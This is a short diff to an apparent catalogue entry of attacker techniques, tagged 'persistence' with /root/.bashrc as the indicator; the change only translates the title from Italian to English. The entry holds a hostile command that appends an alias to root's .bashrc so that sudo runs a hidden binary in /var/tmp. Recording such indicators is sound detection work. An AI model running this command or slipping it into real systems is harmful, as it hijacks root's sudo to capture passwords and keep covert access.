@@ -1,4 +1,4 @@
 # category: persistence
-# title: Riga aggiunta al .bashrc di root
+# title: Line added to root's .bashrc
 # indicator: /root/.bashrc
 echo 'alias sudo="/var/tmp/.s"' >>/root/.bashrc
